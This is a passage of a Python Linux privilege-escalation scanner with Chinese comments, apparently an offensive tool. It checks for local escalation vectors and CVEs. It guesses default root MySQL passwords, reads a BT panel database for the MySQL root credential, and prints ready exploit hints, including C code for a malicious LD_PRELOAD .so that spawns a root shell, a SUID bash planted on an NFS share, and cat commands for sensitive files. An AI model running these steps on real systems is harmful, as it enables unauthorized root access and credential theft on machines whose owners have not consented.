        "reason": f"可读取 {len(readable)} 个敏感文件" if readable else "无明显敏感文件可读",
        "extra": readable[:15],
        "exploit_hint": (
            "\n".join([f"  cat {f}" for f in readable[:5]
                       if "admin_path.pl" not in f])
            + ("\n  宝塔 admin_path.pl 只记路径；default.db 走 LOCAL-BT-MYSQL，勿 cat 整库"
               if any("panel" in f for f in readable) else "")
        ) if readable else "",
    }


def check_root_procs() -> dict:
    """root 进程：mysqld_safe、bash 包装脚本（如 qemu-kvm_ga）。"""
    extra = []
    vuln = False
    out = _run(["ps", "-eo", "user=,pid=,args="], timeout=8)
    if not out or "PID" in out[:40]:
        out = _run(["ps", "aux"], timeout=8)
        lines = []
        for line in out.splitlines()[1:]:
            parts = line.split(None, 10)
            if len(parts) >= 11:
                lines.append(f"{parts[0]} {parts[1]} {parts[10]}")
        out = "\n".join(lines)

    for line in out.splitlines():
        parts = line.split(None, 2)
        if len(parts) < 3:
            continue
        user, _pid, args = parts[0], parts[1], parts[2]
        if user != "root":
            continue
        if "mysqld" in args:
            extra.append(f"root-mysqld:{args[:140]}")
            for d in ("/www/server/mysql", "/www/server/mysql/bin", "/var/lib/mysql"):
                if Path(d).exists() and os.access(d, os.W_OK):
                    extra.append(f"WRITABLE mysql-dir:{d}")
                    vuln = True
        m = re.match(r"(?:/bin/|/usr/bin/)(?:ba)?sh\s+(/\S+)", args)
        if m:
            script = m.group(1)
            tag = f"root-wrapper:{args[:140]}"
            if os.path.exists(script) and os.access(script, os.W_OK):
                extra.append(f"WRITABLE {tag}")
                vuln = True
            else:
                extra.append(tag)
        elif "qemu-kvm_ga" in args or "qemu-ga" in args:
            extra.append(f"root-qemu-ga:{args[:140]}")

    if extra:
        vuln = vuln or any(x.startswith("WRITABLE") for x in extra)

    return {
        "cve": "LOCAL-ROOT-PROC",
        "name": "root 包装脚本 / mysqld_safe",
        "type": "本地提权（可写 root 脚本或 MySQL 目录）",
        "cvss": 7.5,
        "vulnerable": vuln,
        "reason": (
            f"发现 {len(extra)} 条 root 进程线索" if extra
            else "无明显 mysqld_safe / bash 包装脚本"
        ),
        "extra": extra[:12],
        "exploit_hint": (
            "可写 root 包装脚本 → 追加命令等下次执行；mysqld 目录可写见宝塔/MySQL 卡。\n"
            "  改脚本/写插件先问。playbook=传承/反客为主.md"
        ) if extra else "",
    }


def _bt_mysql_root_hint(db: Path) -> list:
    hints = []
    try:
        import sqlite3
        con = sqlite3.connect(f"file:{db}?mode=ro", uri=True)
        tables = [r[0] for r in con.execute(
            "SELECT name FROM sqlite_master WHERE type='table'")]
        hints.append("tables=" + ",".join(tables[:12]))
        weak = {"", "root", "admin", "123456", "password", "mysql", "bt123456"}
        queries = (
            "SELECT value FROM config WHERE key='mysql_root' LIMIT 1",
            "SELECT value FROM config WHERE `key`='mysql_root' LIMIT 1",
            "SELECT mysql_root FROM users LIMIT 1",
            "SELECT mysql_root FROM config LIMIT 1",
        )
        for sql in queries:
            try:
                row = con.execute(sql).fetchone()
            except Exception:
                continue
            if not row:
                continue
            val = row[0]
            if val is None:
                hints.append("mysql_root=null")
            else:
                s = str(val)
                if s.lower() in weak or len(s) <= 4:
                    hints.append("mysql_root=weak-or-empty")
                else:
                    hints.append(f"mysql_root=set(len={len(s)})")
            break
        con.close()
    except Exception as e:
        hints.append(f"sqlite-read-fail:{str(e)[:80]}")
    return hints


def _mysql_local_auth() -> list:
    if not shutil.which("mysql"):
        return ["mysql-client-missing"]
    trials = [
        (["mysql", "-uroot", "--password=", "--connect-timeout=2", "-e", "SELECT 1"], "(empty)"),
        (["mysql", "-uroot", "-proot", "--connect-timeout=2", "-e", "SELECT 1"], "(root)"),
        (["mysql", "-uroot", "-padmin", "--connect-timeout=2", "-e", "SELECT 1"], "(admin)"),
        (["mysql", "-uroot", "-p123456", "--connect-timeout=2", "-e", "SELECT 1"], "(123456)"),
    ]
    hits = []
    for cmd, tag in trials:
        try:
            r = subprocess.run(cmd, capture_output=True, text=True, timeout=4)
            out = (r.stdout or "") + (r.stderr or "")
            if r.returncode == 0 and "ERROR" not in out.upper():
                hits.append(f"local-auth-ok:{tag}")
                break
        except Exception:
            pass
    return hits


def check_bt_mysql() -> dict:
    """宝塔 default.db 可读 + 本机 MySQL 弱口（不 dump、不打印明文密）。"""
    extra = []
    vuln = False
    db = Path("/www/server/panel/data/default.db")
    if db.exists():
        extra.append("default.db-present")
        if os.access(str(db), os.R_OK):
            extra.append("default.db-readable")
            extra.extend(_bt_mysql_root_hint(db))
            vuln = True
        else:
            extra.append("default.db-unreadable")
    for d in ("/www/server/panel", "/www/server/panel/data", "/www/server/mysql"):
        if Path(d).exists() and os.access(d, os.W_OK):
            extra.append(f"writable:{d}")
            vuln = True

    mysql_here = db.exists() or Path("/www/server/panel").exists() or any(
        Path(p).exists() for p in (
            "/var/run/mysqld/mysqld.sock",
            "/tmp/mysql.sock",
            "/www/server/mysql/mysql.sock",
            "/var/lib/mysql/mysql.sock",
        )
    )
    if mysql_here:
        auth = _mysql_local_auth()
        extra.extend(auth)
        if any(x.startswith("local-auth-ok") for x in auth):
            vuln = True

    if not extra:
        extra.append("no-bt-panel-and-no-mysql-client")

    return {
        "cve": "LOCAL-BT-MYSQL",
        "name": "宝塔 default.db / 本机 MySQL 弱口",
        "type": "凭据收割（不 dump）",
        "cvss": 8.5,
        "vulnerable": vuln,
        "reason": (
            "宝塔库可读或本机 MySQL 弱口成立" if vuln
            else "无宝塔库可读、本机 MySQL 未弱口"
        ),
        "extra": extra[:15],
        "exploit_hint": (
            "mysql_root 只记 weak-or-empty / set(len=N)，完整密打码手落案卷。\n"
            "  本机 SELECT 1 即可；mysqldump / 拉全库先问。\n"
            "  playbook=传承/宝塔台.md"
        ) if vuln else "",
    }


def check_ld_preload() -> dict:
    """检查 LD_PRELOAD / LD_LIBRARY_PATH 是否可用于提权"""
    hits = []
    sudo_out = _run(["sudo", "-l", "-n"])

    # 检查 sudo 是否允许 env_keep LD_PRELOAD
    if "LD_PRELOAD" in sudo_out and "env_keep" in sudo_out.lower():
        hits.append("sudo env_keep LD_PRELOAD 可用 → 编译恶意 .so 提权")
    if "LD_LIBRARY_PATH" in sudo_out and "env_keep" in sudo_out.lower():
        hits.append("sudo env_keep LD_LIBRARY_PATH 可用")

    # 检查 /etc/ld.so.conf.d/ 是否有可写目录
    ldconf_dirs = []
    try:
        for f in Path("/etc/ld.so.conf.d/").iterdir():
            content = f.read_text(errors="ignore")
            for line in content.splitlines():
                line = line.strip()
                if line and not line.startswith("#"):
                    if Path(line).exists() and os.access(line, os.W_OK):
                        ldconf_dirs.append(line)
    except Exception:
        pass

    if ldconf_dirs:
        hits.append(f"LD 库目录可写: {ldconf_dirs}")

    return {
        "cve": "LOCAL-LD",
        "name": "LD_PRELOAD / 动态库劫持",
        "type": "本地提权（编译恶意 .so 注入 root 进程）",
        "cvss": 7.0,
        "vulnerable": bool(hits),
        "reason": f"发现 {len(hits)} 个可利用向量" if hits else "无 LD 劫持向量",
        "extra": hits,
        "exploit_hint": ("编译提权 .so：\n"
                         "  #include <stdio.h>\\n#include <sys/types.h>\\n#include <stdlib.h>\\n"
                         "  void _init(){unsetenv(\"LD_PRELOAD\");setgid(0);setuid(0);system(\"/bin/bash\");}\n"
                         "  gcc -fPIC -shared -o /tmp/evil.so evil.c -nostartfiles\n"
                         "  sudo LD_PRELOAD=/tmp/evil.so <允许的命令>") if hits else "",
    }


def check_nfs() -> dict:
    """检查 NFS 挂载是否有 no_root_squash"""
    hits = []
    exports = Path("/etc/exports")
    if exports.exists():
        content = exports.read_text(errors="ignore")
        for line in content.splitlines():
            if "no_root_squash" in line and not line.strip().startswith("#"):
                hits.append(line.strip())

    # 检查当前挂载
    mounts = _run(["mount"])
    if "nfs" in mounts.lower():
        for line in mounts.splitlines():
            if "nfs" in line.lower():
                hits.append(f"NFS 挂载: {line.strip()}")

    return {
        "cve": "LOCAL-NFS",
        "name": "NFS no_root_squash",
        "type": "本地提权（在客户端以 root 写入 SUID 文件）",
        "cvss": 8.0,
        "vulnerable": bool(hits),
        "reason": f"发现 {len(hits)} 个 NFS no_root_squash 配置" if hits else "无危险 NFS 配置",
        "extra": hits[:5],
        "exploit_hint": ("在 NFS 客户端（需有 root）写 SUID shell 到共享目录：\n"
                         "  cp /bin/bash /nfs_share/bash\n"
                         "  chmod +s /nfs_share/bash\n"
                         "  # 在目标机器上：/nfs_share/bash -p → root shell") if hits else "",
    }


# ──────────────────────────── 主流程 ────────────────────────────────

CVE_CHECKS = [
    check_cve_2026_64564,
    check_cve_2024_6387,
    check_cve_2024_1086,
    check_cve_2023_0386,
    check_cve_2022_0847,
    check_cve_2021_3156,
]

LOCAL_CHECKS = [
    check_suid_sgid,
    check_sudo_rules,
    check_cron_writable,
    check_path_writable,
    check_root_procs,
    check_bt_mysql,
    check_capabilities,
    check_docker_socket,
    check_k8s_sa,
    check_writable_passwd,
    check_privileged_groups,
    check_sensitive_files,
    check_ld_preload,
    check_nfs,
]

COLORS = {
    True: "\033[91m",   # 红 = 受影响/存在
    False: "\033[92m",  # 绿 = 安全
    None: "\033[93m",   # 黄 = 未知
}
RESET = "\033[0m"


def _print_results(results: list, section: str):
    vuln_count = sum(1 for r in results if r["vulnerable"])
    print(f"\n{'─'*60}")
    print(f"  {section}  ({vuln_count}/{len(results)} 存在风险)")
    print(f"{'─'*60}")
    for r in results:
        color = COLORS.get(r["vulnerable"], COLORS[None])
        status = "★ 存在" if r["vulnerable"] else ("? 未知" if r["vulnerable"] is None else "  安全")
        print(f"\n[{color}{status}{RESET}]  {r['cve']}  CVSS:{r['cvss']}  {r['name']}")
        print(f"         类型: {r['type']}")
        print(f"         {r['reason']}")
        for e in r.get("extra", [])[:5]:
            print(f"         · {e}")
        if r.get("exploit_hint"):
            print("\033[93m         利用提示:\033[0m")
            for line in r["exploit_hint"].split("\n"):
                print(f"           {line}")


def main():
    ap = argparse.ArgumentParser(description="Linux 本地提权全向量检测（授权主机）")
    ap.add_argument("--json", action="store_true", help="以 JSON 格式输出")
    ap.add_argument("--cve-only", action="store_true", help="只检查 CVE 漏洞")
    ap.add_argument("--local-only", action="store_true", help="只检查本地配置错误")
    ap.add_argument("--out", default="", help="将 JSON 结果写入文件")
    args = ap.parse_args()

    checks = []
    if not args.local_only:
        checks.extend(CVE_CHECKS)
    if not args.cve_only:
        checks.extend(LOCAL_CHECKS)

    results = [fn() for fn in checks]

    if args.json or args.out:
        out = json.dumps(results, ensure_ascii=False, indent=2)
        if args.out:
            Path(args.out).write_text(out)
            print(f"[+] 结果已保存: {args.out}")
        else:
            print(out)
        return

    print(f"\n{'='*60}")
    print("  Linux 本地提权全向量检测报告")
    print(f"  主机: {_run(['hostname'])}")
    print(f"  用户: {_run(['id'])}")
    print(f"  内核: {_kernel_str()}")
    print(f"  容器: {'是' if _in_container() else '否'}")
    print(f"{'='*60}")

    if not args.local_only:
        _print_results([r for r in results if r["cve"].startswith("CVE")], "CVE 内核漏洞")

    if not args.cve_only:
        _print_results([r for r in results if r["cve"].startswith("LOCAL")], "本地配置错误")

    total_vuln = sum(1 for r in results if r["vulnerable"])
    print(f"\n{'='*60}")
    print(f"  汇总: 发现 {total_vuln}/{len(results)} 个提权向量")

    # 按优先级排列可利用路径
    exploitable = [r for r in results if r["vulnerable"] and r.get("exploit_hint")]
    if exploitable:
        print("\n  优先利用路径（按 CVSS 降序）:")
        for r in sorted(exploitable, key=lambda x: x["cvss"], reverse=True)[:5]:
            print(f"    [{r['cvss']}] {r['name']}  ({r['cve']})")
    print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
